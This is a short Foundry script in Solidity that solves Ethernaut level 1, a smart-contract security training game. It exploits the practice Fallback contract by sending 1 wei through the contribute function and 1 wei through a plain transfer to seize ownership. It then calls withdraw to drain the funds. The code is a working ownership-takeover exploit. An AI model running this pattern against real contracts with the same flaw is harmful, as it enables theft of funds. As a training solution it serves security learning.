// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallback} from "src/01/Fallback.sol";

contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL1");
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Fallback level = Fallback(payable(instance));
      
    function run() external {
        vm.startBroadcast(hacker);
        
        level.contribute{value: 1 wei}();
        (bool success, ) = address(level).call{value: 1 wei}("");
        require(success, "failed to call send()");
        level.withdraw();

        vm.stopBroadcast();
    }
}
